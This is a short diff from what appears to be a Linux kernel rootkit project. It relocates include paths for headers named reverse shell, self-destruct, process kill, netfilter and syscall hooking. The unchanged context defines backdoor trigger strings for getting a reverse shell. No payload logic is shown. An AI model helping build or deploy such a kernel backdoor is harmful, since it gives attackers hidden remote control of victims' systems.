@@ -8,11 +8,11 @@
 #include <linux/kthread.h>
 
 
-#include "h_netfilter.h"
-#include "../revshell.h"
-#include "../selfdestruct.h"
-#include "h_kill.h"
-#include "../hooking.h"
+#include "../../include/h_netfilter.h"
+#include "../../include/revshell.h"
+#include "../../include/selfdestruct.h"
+#include "../../include/h_kill.h"
+#include "../../include/hooking.h"
 
 const char* BACKDOOR_KEY_2600 = "2600_PAYLOAD_GET_REVERSE_SHELL";
 const char* BACKDOOR_KEY_2600_CUSTOM = "CUSTOM_2600_PAYLOAD_GET_REVERSE_SHELL_";
